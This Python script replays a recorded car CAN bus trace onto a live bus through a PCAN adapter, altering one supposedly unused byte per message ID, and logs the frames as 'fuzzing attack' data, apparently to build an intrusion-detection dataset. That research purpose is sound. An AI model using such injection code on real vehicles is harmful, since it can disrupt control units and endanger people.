import pandas as pd
import numpy as np
import time
from PCANBasic import *
from rich.console import Console
import datetime
import os 

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

x = datetime.datetime.now()
x = "Dataset\\Fuzzing Attack Injected Datas " + str(x).split()[0] + "-"
ind = 0

while os.path.isfile( x + str(ind) + ".txt"):
    ind += 1
    print("Yes")

print("No")
x = x + str(ind) + ".txt"
f = open(x, "a")



cols = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight']


unused_byte = {'0165': [3, '00'], '02B0': [3, '07'], '0164': [0, '00'], '0370': [0, 'FF'], '043F': [2, '60'], '0440': [0, 'FF'],
 '0018': [0, '00'], '0316': [7, '7F'], '018F': [0, 'FE'], '0080': [1, '17'], '0081': [3, '00'], '0260': [3, '30'], '02A0': [1, '00'],
 '0153': [0, '00'], '0329': [7, '10'], '0382': [0, '40'], '0545': [0, 'C8'], '04F0': [0, '00'], '04B1': [4, '00'], '0350': [1, '2B'],
 '01F1': [0, '00'], '02C0': [0, '3D'], '04F2': [0, 'A0'], '0120': [0, '00'], '0517': [1, '00'], '0587': [0, '00'], '00A0': [6, '00'],
 '00A1': [2, '80'], '0510': [0, '00'], '05E4': [0, '00'], '059B': [0, '00'], '0110': [0, 'E0'], '0050': [0, '00'], '04F1': [0, 'C0'],
 '0690': [0, '03'], '05F0': [0, '00'], '051A': [0, '00'], '0034': [0, '00'], '05A0': [0, '00'], '05A2': [0, '25'], '0042': [0, '0B'],
 '0043': [0, '00'], '0044': [0, '00']}

#importing dataset
def Convert_to_df(path):
    if path[-3:] == "trc":
        data_df = Convert_from_trc(path)[17:]
    elif path[-3:] == "txt": 
        data_df = Convert_from_txt(path)
    else:
        print("Error, not suitable file")
        exit()
    return data_df

def Convert_from_trc(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split(" ")
        b.append(list(filter(('').__ne__, temp)))
    final = pd.DataFrame(b, columns = cols)
    return final

def Convert_from_txt(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split("\t")
        b.append(list(filter(('').__ne__, temp)))
    final = pd.DataFrame(b, columns = cols)
    return final

def Replay_attack(data_iloc):
    all_datas = ""
    time_offset = 0.03
    Replay_attack = TPCANMsg()
    Replay_attack.ID = int(data_iloc[3],16)
    Replay_attack.LEN = int(data_iloc[4])
    Replay_attack.MSGTYPE = PCAN_MESSAGE_STANDARD
    all_datas += data_iloc[3] + "\t" + str(Replay_attack.MSGTYPE) + "\t" + str(Replay_attack.LEN)
    #EDITED BY DDUMWAMU: INITIALIZE YOUR VARIABLES BEFORE USING IT INSIDE THE FUNCTION YOU ***** hahahaa'
    unused_index = 0

    if data_iloc[3] in unused_byte:
        unused_index = unused_byte[data_iloc[3]][0]
        if unused_index == None:
            return
        
    write_data = all_datas
    for i in range(int(data_iloc[4])):
        write_data += "\t" + data_iloc[5+i]

        if unused_index == i :
            Replay_attack.DATA[i] = int(data_iloc[5+i], 16) + 1
            all_datas += "\t" + bcolors.OKGREEN + str(hex(Replay_attack.DATA[i])) + bcolors.ENDC
        else:
            Replay_attack.DATA[i] = int(data_iloc[5+i], 16)
            all_datas += "\t" + str(hex(Replay_attack.DATA[i]))
        
    unused_index = 0
    for _ in range(8 - int(data_iloc[4])):
        write_data += "\t" + "-1"
    all_datas += "\n"
    write_data += "\n"
    print(all_datas)
    f.write(write_data)
    res = CAN.Write(CAN_BUS, Replay_attack)
    if res != PCAN_ERROR_OK:
        print("Oh nooo")
        result = CAN.GetErrorText(res)
        print(result)
        exit()
    time.sleep(time_offset)


if __name__ == "__main__":
        
    CAN = PCANBasic()                            #CAN 생성자 
    CAN_BUS = PCAN_USBBUS6
    CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    
    start_time = time.time()
    dataset_path = "Dataset\\"
    dataset_name = "2022.08.12 구쏘울 C-CAN (정상).trc"
    df_dataset = Convert_to_df(dataset_path+dataset_name)
    nID = list(dict.fromkeys(df_dataset["ID"]))
    ilo_df = df_dataset.iloc
    l = len(df_dataset)
    for i in range(l - 1):
        all_data = ""
        print(bcolors.OKBLUE)
        time_off = time.time() - start_time
        all_data += ("%.2f" % time_off) + "\t"
        print(all_data, end="\t")
        all_data += str(ilo_df[i][3]) + "\t"
        all_data += str(ilo_df[i][2]) + "\t"
        all_data += str(ilo_df[i][4]) + "\t"
        for j in range(int(ilo_df[i][4])):
            all_data += ilo_df[i][5+j] + "\t"
        
        print(all_data)
        print(bcolors.ENDC)
        Replay_attack(ilo_df[i])
    
    
    
    

